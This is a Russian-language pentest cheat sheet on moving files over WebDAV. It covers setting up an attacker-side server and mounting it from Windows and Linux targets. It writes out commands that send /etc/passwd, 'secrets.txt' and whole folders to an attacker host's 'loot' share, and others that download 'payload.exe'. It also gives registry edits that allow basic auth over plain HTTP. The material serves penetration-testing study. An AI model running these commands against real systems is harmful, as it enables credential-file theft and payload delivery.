# 04 - WebDAV

> [← README](../../README_RU.md) · [Следующий раздел →](05-ftp.md)

WebDAV полезен, когда SMB режется, но HTTP-порт открыт: Windows умеет монтировать WebDAV как сетевой диск. Двусторонний обмен (download + upload) через один сервер.

> **Вынесено в другие файлы:** SMB - [03-smb.md](03-smb.md), FTP - [05-ftp.md](05-ftp.md), HTTP-загрузка - [01](01-attacker-to-target.md)/[02](02-target-to-attacker.md).

---

## Навигация

|  |  |
|---|---|
| [1.💻Attacker - поднять WebDAV-сервер (LHOST)](#1attacker---поднять-webdav-сервер-lhost) | [2.🪟Windows target ↔ Attacker (всё на RHOST)](#2windows-target--attacker-всё-на-rhost) |
| [3.🐧Linux target ↔ Attacker (всё на RHOST)](#3linux-target--attacker-всё-на-rhost) | [4. Диагностика](#4-диагностика) |

---

## 1.💻Attacker - поднять WebDAV-сервер (LHOST)

### wsgidav (Python)

**Создать venv и установить:**
```bash
python3 -m venv /tmp/webdav-venv && source /tmp/webdav-venv/bin/activate && pip install wsgidav cheroot
```

**Каталог для файлов:**
```bash
mkdir -p /tmp/share
```

**Запуск (анонимный доступ, порт 80 - нужен `sudo`):**
```bash
sudo /tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous
```

**Запуск на непривилегированном порту 8080 (без `sudo`):**
```bash
/tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=8080 --root=/tmp/share --auth=anonymous
```

**Аутентификация по системным юзерам Linux (`pam-login`):**
```bash
/tmp/webdav-venv/bin/pip install 'wsgidav[pam]'
sudo /tmp/webdav-venv/bin/wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=pam-login
```

> Произвольные логин/пароль через CLI wsgidav не задать - нужен конфиг-файл. Если нужен простой `user:pass` - проще взять `rclone` (ниже).

### rclone serve webdav - проще и с логином/паролем

**Установка:**
```bash
sudo apt install -y rclone
```

**Запуск с логином/паролем на порту 80:**
```bash
sudo rclone serve webdav /tmp/share --addr :80 --user test --pass test
```

**Только для чтения (цель не сможет ничего записать):**
```bash
sudo rclone serve webdav /tmp/share --addr :80 --user test --pass test --read-only
```

**По TLS (`--cert` - это cert+CA в одном файле, `--key` - приватный ключ):**
```bash
sudo rclone serve webdav /tmp/share --addr :443 --user test --pass test --cert server.pem --key server.key
```

### dufs - один бинарь, WebDAV из коробки

**Установка (Rust):**
```bash
cargo install dufs
```

**Запуск с разрешёнными upload/delete на порту 80:**
```bash
sudo dufs -A -b 0.0.0.0 -p 80 /tmp/share
```

**С логином/паролем:**
```bash
sudo dufs -a 'admin:123@/:rw' -b 0.0.0.0 -p 80 /tmp/share
```

**С TLS:**
```bash
sudo dufs --tls-cert server.pem --tls-key server.key -b 0.0.0.0 -p 443 /tmp/share
```

### wsgidav в Docker

**Запуск готового образа:**
```bash
docker run --rm -it -p 8080:8080 -v /tmp/share:/var/wsgidav-root mar10/wsgidav
```

---

## 2.🪟Windows target ↔ Attacker (всё на RHOST)

### Включить службу WebClient

Без неё Windows не умеет ходить на WebDAV.

**Проверить статус службы:**
```cmd
sc query WebClient
```

**Включить автозапуск:**
```cmd
sc config WebClient start= auto
```

**Запустить:**
```cmd
net start WebClient
```

> Если `sc query` пишет «The specified service does not exist as an installed service» - компонент отсутствует (урезанная сборка).

### Реестр: basic auth по HTTP и лимит размера

По умолчанию Windows пускает basic-auth только по HTTPS и режет файлы ~50 МБ.

**Разрешить basic-auth и по HTTP (значение 2):**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters /v BasicAuthLevel /t REG_DWORD /d 2 /f
```

**Поднять лимит размера файла до максимума:**
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\WebClient\Parameters /v FileSizeLimitInBytes /t REG_DWORD /d 4294967295 /f
```

**Перезапустить WebClient, чтобы применилось:**
```cmd
net stop WebClient && net start WebClient
```

### Быстрый доступ

**Браузер:**
```text
http://LHOST:80/
```

**Проводник - UNC-путь (`@80` = порт):**
```text
\\LHOST@80\DavWWWRoot\
```

### Download (цель получает файл)

**CMD - примонтировать WebDAV как диск:**
```cmd
net use I: http://%LHOST%/
```

**CMD - скопировать с диска:**
```cmd
copy I:\payload.exe C:\Users\%USERNAME%\Downloads\
```

**CMD - с логином/паролем:**
```cmd
net use I: http://%LHOST%/ /user:test test
```

**CMD - напрямую по UNC, без монтирования:**
```cmd
copy \\%LHOST%@80\DavWWWRoot\payload.exe C:\Users\Public\
```

**curl.exe - скачать по HTTP:**
```cmd
curl.exe http://%LHOST%/payload.exe -o C:\Users\Public\payload.exe
```

**PowerShell - Copy-Item по UNC:**
```powershell
Copy-Item -Path "\\$LHOST@80\DavWWWRoot\payload.exe" -Destination "C:\Users\$env:USERNAME\Downloads\"
```

### Upload (цель отправляет файл)

**CMD - скопировать на смонтированный диск:**
```cmd
copy C:\Users\Public\secrets.txt I:\
```

**CMD - напрямую по UNC:**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%@80\DavWWWRoot\
```

**CMD - в подпапку (папку создать заранее):**
```cmd
copy C:\Users\Public\secrets.txt \\%LHOST%@80\DavWWWRoot\loot\
```

**curl.exe - PUT-загрузка файла:**
```cmd
curl.exe -T C:\Users\Public\secrets.txt http://%LHOST%/secrets.txt
```

**curl.exe - создать папку на сервере (MKCOL):**
```cmd
curl.exe -X MKCOL http://%LHOST%/loot
```

**robocopy - залить папку целиком (через UNC):**
```cmd
robocopy C:\Users\Public\secrets \\%LHOST%@80\DavWWWRoot\loot /E
```

### Отключить после работы

**Отмонтировать диск:**
```cmd
net use I: /delete
```

**Остановить службу (вернуть как было):**
```cmd
net stop WebClient
```

---

## 3.🐧Linux target ↔ Attacker (всё на RHOST)

**Браузер:**
```text
http://$LHOST:80/
```

### davfs2 - смонтировать как обычную ФС

**Установка:**
```bash
sudo apt install -y davfs2
```

**Примонтировать (логин/пароль спросит интерактивно):**
```bash
sudo mount -t davfs http://$LHOST /mnt
```

**Примонтировать с логином/паролем и `noexec`:**
```bash
sudo mount -t davfs http://$LHOST /mnt -o username=test,password=test,noexec
```

**Скачать файл с примонтированной шары:**
```bash
cp /mnt/payload.exe .
```

**Залить файл на шару:**
```bash
cp /etc/passwd /mnt/
```

**Отмонтировать:**
```bash
sudo umount /mnt
```

### cadaver - интерактивный WebDAV-клиент

**Подключиться:**
```bash
cadaver http://$LHOST
```

**Внутри - список файлов:**
```text
ls
```

**Внутри - скачать файл:**
```text
get payload.exe
```

**Внутри - залить файл:**
```text
put /etc/passwd
```

**Внутри - создать папку и выйти:**
```text
mkcol loot
quit
```

### curl - WebDAV-методы без установки чего-либо

**Скачать файл (GET):**
```bash
curl -O http://$LHOST/payload.exe
```

**Залить файл (PUT):**
```bash
curl -T /etc/passwd http://$LHOST/passwd
```

**Список каталога (PROPFIND, глубина 1):**
```bash
curl -X PROPFIND -H "Depth: 1" http://$LHOST/
```

**Создать папку (MKCOL):**
```bash
curl -X MKCOL http://$LHOST/loot
```

**Удалить файл (DELETE):**
```bash
curl -X DELETE http://$LHOST/loot/old.txt
```

**С basic-auth:**
```bash
curl -u test:test -T /etc/passwd http://$LHOST/passwd
```

---

## 4. Диагностика

**Порт открыт:**
```bash
nc -zv $LHOST 80
```

**Сервер отвечает и поддерживает WebDAV (ищем `DAV:` в заголовках):**
```bash
curl -I http://$LHOST/
```

**Список содержимого через WebDAV:**
```bash
curl -X PROPFIND -H "Depth: 1" http://$LHOST/
```

**Служба WebClient на цели:**
```cmd
sc query WebClient
```

> **Частые грабли:**
>
> - **Служба `WebClient` выключена** по умолчанию на Windows - включаем (`sc config WebClient start= auto` + `net start WebClient`), иначе `net use`/Проводник на WebDAV не пойдут.
> - **Basic-auth только по HTTPS** по умолчанию (`BasicAuthLevel=1`) - для plain HTTP поднимаем до `2` (см. раздел 2).
> - **Лимит ~50 МБ** на файл (`FileSizeLimitInBytes`) - поднимаем до `4294967295`.
> - **Порт 80 < 1024** - сервер на LHOST запускаем через `sudo`.
> - **Нестандартный порт в UNC** задаётся через `@`, например `\\LHOST@8080\DavWWWRoot\`.
> - **Самоподписанный HTTPS** Windows-WebClient обычно отвергает - либо HTTP, либо нормальный серт.
> - **`net use` на `http://`-URL** иногда капризничает: помогает явный слэш в конце (`http://LHOST/`) и включённый WebClient.
> - **Фаервол LHOST** может не пускать входящий 80: `sudo ufw allow 80/tcp`.

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

Подробнее - [README](../../README_RU.md#обозначения-и-переменные).

---

[← Назад к справочнику](../../README_RU.md)
